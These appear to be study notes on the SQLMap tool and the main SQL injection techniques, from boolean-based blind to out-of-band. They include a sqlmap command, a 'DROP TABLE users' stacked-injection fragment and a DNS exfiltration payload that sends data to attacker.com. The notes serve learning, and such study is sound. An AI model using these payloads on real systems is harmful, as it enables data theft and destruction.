- `sqlmap -u "http://www.example.com/vuln.php?id=1" --batch`
	- `Note: in this case, option '-u' is used to provide the target URL, while the switch '--batch' is used for skipping any required user-input, by automatically choosing using the default option.`

### Boolean-based Bling Injection
- SQLMap exploits these vulnerabilities through the differentiation of TRUE from FALSE query results.
- the differentiation is done by comparing server responses.
	- **TRUE** - none to marginal response difference to the regular response
	- **FALSE** - substantial difference from regular response.
### Error Based:
- performed when dbms queries are returned as part of the server response.
- `Error-based SQLi is considered as faster than all other types, except UNION query-based, because it can retrieve a limited amount (e.g., 200 bytes) of data called "chunks" through each request.`
### Union based:
- extend the original vulnerable query with injected statements' results
- additional results can be extracted and displayed on the response page itself.
### Stacked:
- `IN; DROP TABLE users;`
### Time based:
- server response time is checked
	- TRUE: lot of difference in time
	- FALSE: no difference in time
### Inline queries:
- embedded in a query
### Out of band:
- SQLMap supports out-of-band SQLi through "DNS exfiltration," where requested queries are retrieved through DNS traffic.
- eg: `LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))`
- `By running the SQLMap on the DNS server for the domain under control (e.g. `.attacker.com`), SQLMap can perform the attack by forcing the server to request non-existent subdomains (e.g. `foo.attacker.com`), where `foo` would be the SQL response we want to receive. SQLMap can then collect these erroring DNS requests and collect the `foo` part, to form the entire SQL response.
